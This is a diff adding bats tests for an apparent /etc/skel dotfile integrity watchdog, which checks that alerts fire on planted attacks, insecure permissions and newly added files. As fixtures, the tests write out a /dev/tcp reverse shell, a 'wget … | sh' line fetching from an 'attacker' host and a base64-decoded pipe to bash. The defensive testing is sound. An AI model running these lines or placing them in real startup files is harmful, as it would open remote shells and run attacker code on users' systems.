@@ -120,3 +120,77 @@ seed_benign() {
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — skel inventory enumerates new-user-rc-template surface)" {
+    seed_benign
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in skel dotfile → alert" {
+    seed_benign
+    run_wd
+    printf '# .bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${SKELD}/.bashrc"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in skel dotfile → alert" {
+    seed_benign
+    run_wd
+    printf '# .bashrc\nwget -qO- http://attacker/p | sh\n' > "${SKELD}/.bashrc"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe): obfuscation variant in skel dotfile → alert" {
+    seed_benign
+    run_wd
+    printf '# .bashrc\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${SKELD}/.bashrc"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable skel dotfile): group-writable → alert above world-writable bar" {
+    seed_benign
+    run_wd
+    chmod 0664 "${SKELD}/.bashrc"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (pre-existing world-writable skel dotfile): baseline_initial fires alert at install-time" {
+    seed_benign
+    chmod 0666 "${SKELD}/.bashrc"
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (recursion into subdir): hidden dotfile in skel subdir is scanned (find -type f recurses)" {
+    seed_benign
+    mkdir -p "${SKELD}/.config"
+    printf '# config-init\nbash -i >& /dev/tcp/9.9.9.9/4444 0>&1\n' > "${SKELD}/.config/init"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "DELTA detect — ADDED skel dotfile (attacker drops a new .profile) surfaces in sample" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '# distinctive-attacker\necho new\n' > "${SKELD}/.distinctive-attacker-profile"
+    run_wd
+    cap | grep -q 'distinctive-attacker'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    seed_benign
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-skel -- ')
+    [ "${main_count}" = "1" ]
+}
